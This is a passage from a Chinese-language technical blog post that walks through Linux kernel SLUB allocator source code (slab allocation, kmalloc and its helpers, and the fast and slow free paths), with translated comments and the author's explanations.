class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">gfp_t</span> flags, <span class="hljs-type">int</span> node)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">slab</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_order_objects</span> <span class="hljs-title">oo</span> =</span> s-&gt;oo;<br><span class="hljs-type">gfp_t</span> alloc_gfp;<br><span class="hljs-type">void</span> *start, *p, *next;<br><span class="hljs-type">int</span> idx;<br><span class="hljs-type">bool</span> shuffle;<br><br>flags &amp;= gfp_allowed_mask;<br><br>flags |= s-&gt;allocflags;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 让初始的高阶分配在内存压力下失败，以便我们回退到最小阶分配。</span><br><span class="hljs-comment"> */</span><br>alloc_gfp = (flags | __GFP_NOWARN | __GFP_NORETRY) &amp; ~__GFP_NOFAIL;<br><span class="hljs-keyword">if</span> ((alloc_gfp &amp; __GFP_DIRECT_RECLAIM) &amp;&amp; oo_order(oo) &gt; oo_order(s-&gt;min))<br>alloc_gfp = (alloc_gfp | __GFP_NOMEMALLOC) &amp; ~__GFP_RECLAIM;<br><br>slab = alloc_slab_page(alloc_gfp, node, oo);<br><span class="hljs-keyword">if</span> (unlikely(!slab)) &#123;<br>oo = s-&gt;min;<br>alloc_gfp = flags;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 分配可能由于碎片而失败。 如果可能的话尝试较低顺序的分配</span><br><span class="hljs-comment"> */</span><br>slab = alloc_slab_page(alloc_gfp, node, oo);<br><span class="hljs-keyword">if</span> (unlikely(!slab))<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>stat(s, ORDER_FALLBACK);<br>&#125;<br><br>slab-&gt;objects = oo_objects(oo);<br>slab-&gt;inuse = <span class="hljs-number">0</span>;<br>slab-&gt;frozen = <span class="hljs-number">0</span>;<br><br>account_slab(slab, oo_order(oo), s, flags);<br><br>slab-&gt;slab_cache = s;<br><br>kasan_poison_slab(slab);<br><br>start = slab_address(slab);<br><br>setup_slab_debug(s, slab, start);<br><br>shuffle = shuffle_freelist(s, slab);<br><br><span class="hljs-keyword">if</span> (!shuffle) &#123;<br>start = fixup_red_left(s, start);<br>start = setup_object(s, start);<br>slab-&gt;freelist = start;<br><span class="hljs-keyword">for</span> (idx = <span class="hljs-number">0</span>, p = start; idx &lt; slab-&gt;objects - <span class="hljs-number">1</span>; idx++) &#123;<br>next = p + s-&gt;size;<br>next = setup_object(s, next);<br>set_freepointer(s, p, next);<br>p = next;<br>&#125;<br>set_freepointer(s, p, <span class="hljs-literal">NULL</span>);<br>&#125;<br><br><span class="hljs-keyword">return</span> slab;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="seven-check-new-slab"><a href="#seven-check-new-slab" class="headerlink" title=":seven:check_new_slab"></a>:seven:check_new_slab</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c">check_new_slab:<br><br><span class="hljs-keyword">if</span> (kmem_cache_debug(s)) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 对于这里的调试缓存，我们必须通过 alloc_single_from_partial() 因此只需存储跟踪信息并返回对象</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (s-&gt;flags &amp; SLAB_STORE_USER)<br>set_track(s, freelist, TRACK_ALLOC, addr);<br><br><span class="hljs-keyword">return</span> freelist;<br>&#125;<br><br><span class="hljs-keyword">if</span> (unlikely(!pfmemalloc_match(slab, gfpflags))) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 对于 !pfmemalloc_match() 情况，我们不加载空闲列表，这样我们就不会更容易地进行进一步的不匹配分配。</span><br><span class="hljs-comment"> */</span><br>deactivate_slab(s, slab, get_freepointer(s, freelist));<br><span class="hljs-keyword">return</span> freelist;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="eight-retry-load-slab"><a href="#eight-retry-load-slab" class="headerlink" title=":eight:retry_load_slab"></a>:eight:retry_load_slab</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c">retry_load_slab:<br><br>local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">if</span> (unlikely(c-&gt;slab)) &#123; <span class="hljs-comment">//若per-cpu的slab不为空</span><br><span class="hljs-type">void</span> *flush_freelist = c-&gt;freelist;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">flush_slab</span> =</span> c-&gt;slab;<br><br>c-&gt;slab = <span class="hljs-literal">NULL</span>; <br>c-&gt;freelist = <span class="hljs-literal">NULL</span>;<br>c-&gt;tid = next_tid(c-&gt;tid);<br><br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><br>deactivate_slab(s, flush_slab, flush_freelist); <span class="hljs-comment">//使其flush_slab不活动</span><br><br>stat(s, CPUSLAB_FLUSH);<br><br><span class="hljs-keyword">goto</span> retry_load_slab;<br>&#125;<br>c-&gt;slab = slab; <span class="hljs-comment">//附上我们的新获得的slab</span><br><br><span class="hljs-keyword">goto</span> load_freelist; <span class="hljs-comment">//跳回该标签进行分配</span><br></code></pre></td></tr></table></figure><h2 id="3-kmalloc相关"><a href="#3-kmalloc相关" class="headerlink" title="3.kmalloc相关"></a>3.kmalloc相关</h2><p>我们接触的比较多的那就直接是这个kmalloc了，其他的一些顶层接口包括他都会调用上面讲的<code>slab_alloc_node</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * kmalloc - 分配内核内存</span><br><span class="hljs-comment"> * @size: 需要的内存大小</span><br><span class="hljs-comment"> * @flags: 描述分配上下文</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * kmalloc 是为小于内核页大小的对象分配内存的常规方法。</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 分配的对象地址至少与 ARCH_KMALLOC_MINALIGN 字节对齐。 </span><br><span class="hljs-comment"> * 对于两个字节的幂的@size，也保证对齐至少到该大小。</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * @flags 参数可能是定义在下面位置的 GFP 标志之一</span><br><span class="hljs-comment"> * include/linux/gfp_types.h and described at</span><br><span class="hljs-comment"> * :ref:`Documentation/core-api/mm-api.rst &lt;mm-api-gfp-flags&gt;`</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * @flags 的推荐用法描述于</span><br><span class="hljs-comment"> * :ref:`Documentation/core-api/memory-allocation.rst &lt;memory_allocation&gt;`</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 以下是最有用的 GFP 标志的简要概述</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %GFP_KERNEL</span><br><span class="hljs-comment"> *分配普通内核内存，可睡眠</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %GFP_NOWAIT</span><br><span class="hljs-comment"> *无法睡眠的分配</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %GFP_ATOMIC</span><br><span class="hljs-comment"> *不会配置sleep。 可以使用应急池。</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *  还可以通过在以下一个或多个附加 @flags 中进行“或”运算来设置不同的标志： </span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %__GFP_ZERO</span><br><span class="hljs-comment"> *返回前填充0. Also see kzalloc().</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %__GFP_HIGH</span><br><span class="hljs-comment"> *该分配有着高权限并且或许会使用紧急池.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %__GFP_NOFAIL</span><br><span class="hljs-comment"> *表明这个分配绝不允许失败（使用前三思）.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %__GFP_NORETRY</span><br><span class="hljs-comment"> *如果内存并非紧急需要，那么在第一时间放弃他</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %__GFP_NOWARN</span><br><span class="hljs-comment"> *如果分配失败，不爆出警告</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %__GFP_RETRY_MAYFAIL</span><br><span class="hljs-comment"> *非常努力地尝试成功分配但最终失败。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> __always_inline __alloc_size(<span class="hljs-number">1</span>) <span class="hljs-type">void</span> *<span class="hljs-title function_">kmalloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size, <span class="hljs-type">gfp_t</span> flags)</span><br>&#123;<br><span class="hljs-keyword">if</span> (__builtin_constant_p(size) &amp;&amp; size) &#123; <span class="hljs-comment">//判断size在编译时是否为常量，若是则返回1，否则返回0</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> index;<br><br><span class="hljs-keyword">if</span> (size &gt; KMALLOC_MAX_CACHE_SIZE) <span class="hljs-comment">//如果size大小大于一页，则调用kmalloc_large</span><br><span class="hljs-keyword">return</span> kmalloc_large(size, flags);<br><br>index = kmalloc_index(size);<br><span class="hljs-keyword">return</span> kmalloc_trace(<br>kmalloc_caches[kmalloc_type(flags)][index],<br>flags, size);<br>&#125;<br><span class="hljs-keyword">return</span> __kmalloc(size, flags);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>解释一下其中所用到的几个函数</p><h3 id="kmalloc-large"><a href="#kmalloc-large" class="headerlink" title="kmalloc_large"></a>kmalloc_large</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">kmalloc_large</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size, <span class="hljs-type">gfp_t</span> flags)</span><br>&#123;<br><span class="hljs-type">void</span> *ret = __kmalloc_large_node(size, flags, NUMA_NO_NODE);<br><br>trace_kmalloc(_RET_IP_, ret, size, PAGE_SIZE &lt;&lt; get_order(size),<br>      flags, NUMA_NO_NODE);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中调用的<code>__kmalloc_large_node</code>函数是先判断size属于的order大小，然后再调用伙伴系统的接口<code>alloc_pages_node</code>来获取相应的页再转为地址返回</p><h3 id="kmalloc-index"><a href="#kmalloc-index" class="headerlink" title="kmalloc_index"></a>kmalloc_index</h3><p>实际上就是调用了<code>__kmalloc_index</code>，大致含义就是返回相应size所对应的<code>kmem_caches</code>二维数组的列下标（这代码码的还挺好看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Figure out which kmalloc slab an allocation of a certain size</span><br><span class="hljs-comment"> * belongs to.</span><br><span class="hljs-comment"> * 0 = zero alloc</span><br><span class="hljs-comment"> * 1 =  65 .. 96 bytes</span><br><span class="hljs-comment"> * 2 = 129 .. 192 bytes</span><br><span class="hljs-comment"> * n = 2^(n-1)+1 .. 2^n</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 注意：__kmalloc_index() 是编译时优化的，而不是运行时优化的； </span><br><span class="hljs-comment"> * 典型用法是通过 kmalloc_index() 进行，因此在编译时进行评估。</span><br><span class="hljs-comment"> * !size_is_constant 的调用者只能是测试模块，可以容忍 __kmalloc_index() 的运行时开销。 </span><br><span class="hljs-comment"> * 另请参阅 kmalloc_slab()。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> __kmalloc_index(<span class="hljs-type">size_t</span> size,<br>    <span class="hljs-type">bool</span> size_is_constant)<br>&#123;<br><span class="hljs-keyword">if</span> (!size)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (size &lt;= KMALLOC_MIN_SIZE)<br><span class="hljs-keyword">return</span> KMALLOC_SHIFT_LOW;<br><br><span class="hljs-keyword">if</span> (KMALLOC_MIN_SIZE &lt;= <span class="hljs-number">32</span> &amp;&amp; size &gt; <span class="hljs-number">64</span> &amp;&amp; size &lt;= <span class="hljs-number">96</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><span class="hljs-keyword">if</span> (KMALLOC_MIN_SIZE &lt;= <span class="hljs-number">64</span> &amp;&amp; size &gt; <span class="hljs-number">128</span> &amp;&amp; size &lt;= <span class="hljs-number">192</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;<br><span class="hljs-keyword">if</span> (size &lt;=          <span class="hljs-number">8</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">3</span>;<br><span class="hljs-keyword">if</span> (size &lt;=         <span class="hljs-number">16</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">4</span>;<br><span class="hljs-keyword">if</span> (size &lt;=         <span class="hljs-number">32</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">5</span>;<br><span class="hljs-keyword">if</span> (size &lt;=         <span class="hljs-number">64</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">6</span>;<br><span class="hljs-keyword">if</span> (size &lt;=        <span class="hljs-number">128</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">7</span>;<br><span class="hljs-keyword">if</span> (size &lt;=        <span class="hljs-number">256</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">8</span>;<br><span class="hljs-keyword">if</span> (size &lt;=        <span class="hljs-number">512</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">9</span>;<br><span class="hljs-keyword">if</span> (size &lt;=       <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">10</span>;<br><span class="hljs-keyword">if</span> (size &lt;=   <span class="hljs-number">2</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">11</span>;<br><span class="hljs-keyword">if</span> (size &lt;=   <span class="hljs-number">4</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">12</span>;<br><span class="hljs-keyword">if</span> (size &lt;=   <span class="hljs-number">8</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">13</span>;<br><span class="hljs-keyword">if</span> (size &lt;=  <span class="hljs-number">16</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">14</span>;<br><span class="hljs-keyword">if</span> (size &lt;=  <span class="hljs-number">32</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">15</span>;<br><span class="hljs-keyword">if</span> (size &lt;=  <span class="hljs-number">64</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">16</span>;<br><span class="hljs-keyword">if</span> (size &lt;= <span class="hljs-number">128</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">17</span>;<br><span class="hljs-keyword">if</span> (size &lt;= <span class="hljs-number">256</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">18</span>;<br><span class="hljs-keyword">if</span> (size &lt;= <span class="hljs-number">512</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">19</span>;<br><span class="hljs-keyword">if</span> (size &lt;= <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">20</span>;<br><span class="hljs-keyword">if</span> (size &lt;=  <span class="hljs-number">2</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">21</span>;<br><br><span class="hljs-keyword">if</span> (!IS_ENABLED(CONFIG_PROFILE_ALL_BRANCHES) &amp;&amp; size_is_constant)<br>BUILD_BUG_ON_MSG(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;unexpected size in kmalloc_index()&quot;</span>);<br><span class="hljs-keyword">else</span><br>BUG();<br><br><span class="hljs-comment">/* Will never be reached. Needed because the compiler may complain */</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="kmalloc-trace"><a href="#kmalloc-trace" class="headerlink" title="kmalloc_trace"></a>kmalloc_trace</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">kmalloc_trace</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">gfp_t</span> gfpflags, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br><span class="hljs-type">void</span> *ret = __kmem_cache_alloc_node(s, gfpflags, NUMA_NO_NODE, <span class="hljs-comment">//该函数相当于一个跳板，实际上仅仅是调用一个slab_alloc_node获取一个object</span><br>    size, _RET_IP_);<br><br>trace_kmalloc(_RET_IP_, ret, size, s-&gt;size, gfpflags, NUMA_NO_NODE);<br><br>ret = kasan_kmalloc(s, ret, size, gfpflags);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>上面的kesan_kmalloc具体并不参与分配过程，他主要用来对内存进行安全检测，下面是搜索到的解释</p><blockquote><p>Kernel Address SANitizer(KASAN)是一种动态内存安全错误检测工具，主要功能是 检查内存越界访问和使用已释放内存的问题</p></blockquote><p>因此，来整理一下kmalloc的运行过程</p><ol><li>判断size，若大于了1页的范围，则调用kmalloc_large,然后使用伙伴系统的接口</li><li>这里说明size小于1页，我们调用kmalloc_index来获取相应kmalloc_caches的下标，然后调用kmalloc_trace来作为slab_alloc_node的上层接口来返回object</li></ol><h2 id="4-释放过程"><a href="#4-释放过程" class="headerlink" title="4.释放过程"></a>4.释放过程</h2><p>咱们从比较通用的接口讲起</p><h3 id="do-slab-free"><a href="#do-slab-free" class="headerlink" title="do_slab_free"></a>do_slab_free</h3><p>该函数并不复杂，也就是在多cpu的情况下释放一个或多个object,整体函数表现为快路径</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Fastpath 具有强制内联功能，可生成 kfree 和 kmem_cache_free，</span><br><span class="hljs-comment"> * 无需额外的函数调用即可执行快速路径释放。</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 仅当我们释放该处理器的当前 cpu slab时，快速路径才可能实现。 </span><br><span class="hljs-comment"> * 如果我们之前刚刚分配过该项目，通常会出现这种情况。</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 如果快速路径不可行，则返回到 __slab_free ，我们在其中进行各种特殊处理。</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 通过指定 head 和 tail ptr 以及对象计数 (cnt)，</span><br><span class="hljs-comment"> * 可以批量释放具有多个对象（全部指向同一块）的空闲列表。 </span><br><span class="hljs-comment"> * 通过设置尾指针指示批量释放。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span> <span class="hljs-title function_">do_slab_free</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s,</span><br><span class="hljs-params"><span class="hljs-keyword">struct</span> slab *slab, <span class="hljs-type">void</span> *head, <span class="hljs-type">void</span> *tail,</span><br><span class="hljs-params"><span class="hljs-type">int</span> cnt, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr)</span><br>&#123;<br><span class="hljs-type">void</span> *tail_obj = tail ? : head;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_cpu</span> *<span class="hljs-title">c</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> tid;<br><span class="hljs-type">void</span> **freelist;<br><br>redo:<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 确定每个 cpu 板当前的 cpus。 之后cpu可能会改变。 </span><br><span class="hljs-comment"> * 但这并不重要，因为数据是通过该指针检索的。 </span><br><span class="hljs-comment"> * 如果 cmpxchg 期间我们位于同一个 cpu 上，则释放将会成功。</span><br><span class="hljs-comment"> */</span><br>c = raw_cpu_ptr(s-&gt;cpu_slab);<br>tid = READ_ONCE(c-&gt;tid);<br><br><span class="hljs-comment">/* Same with comment on barrier() in slab_alloc_node() */</span><br>barrier();<br><br><span class="hljs-keyword">if</span> (unlikely(slab != c-&gt;slab)) &#123; <span class="hljs-comment">//如果传入的slab并不是当前cpu的slab，则调用下面函数</span><br>__slab_free(s, slab, head, tail_obj, cnt, addr);<br><span class="hljs-keyword">return</span>;<br>&#125;<br> <span class="hljs-comment">/*</span><br><span class="hljs-comment">  * 这里说明途中cpu的slab和传入的slab相同，那么就需要进行锁操作来防止不同cpu的访问</span><br><span class="hljs-comment">  */</span><br><span class="hljs-keyword">if</span> (USE_LOCKLESS_FAST_PATH()) &#123; <span class="hljs-comment">//该宏时根据编译选项来确定真假，但实际上均是使用锁来固定当前处理的该slab被锁在自身原来的cpu上</span><br>freelist = READ_ONCE(c-&gt;freelist);<br><br>set_freepointer(s, tail_obj, freelist); <span class="hljs-comment">//头插c-&gt;freelist</span><br><br><span class="hljs-keyword">if</span> (unlikely(!this_cpu_cmpxchg_double(<br>s-&gt;cpu_slab-&gt;freelist, s-&gt;cpu_slab-&gt;tid,<br>freelist, tid,<br>head, next_tid(tid)))) &#123;<br><br>note_cmpxchg_failure(<span class="hljs-string">&quot;slab_free&quot;</span>, s, tid);<br><span class="hljs-keyword">goto</span> redo;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/* Update the free list under the local lock */</span><br>local_lock(&amp;s-&gt;cpu_slab-&gt;lock);<br>c = this_cpu_ptr(s-&gt;cpu_slab);<br><span class="hljs-keyword">if</span> (unlikely(slab != c-&gt;slab)) &#123;<br>local_unlock(&amp;s-&gt;cpu_slab-&gt;lock);<br><span class="hljs-keyword">goto</span> redo;<br>&#125;<br>tid = c-&gt;tid;<br>freelist = c-&gt;freelist;<br><br>set_freepointer(s, tail_obj, freelist);<br>c-&gt;freelist = head;<br>c-&gt;tid = next_tid(tid);<br><br>local_unlock(&amp;s-&gt;cpu_slab-&gt;lock);<br>&#125;<br>stat(s, FREE_FASTPATH);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="slab-free"><a href="#slab-free" class="headerlink" title="__slab_free"></a>__slab_free</h3><p>此处object属于的slab并不是当前cpu的slab，该处的函数也就是慢路径</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span 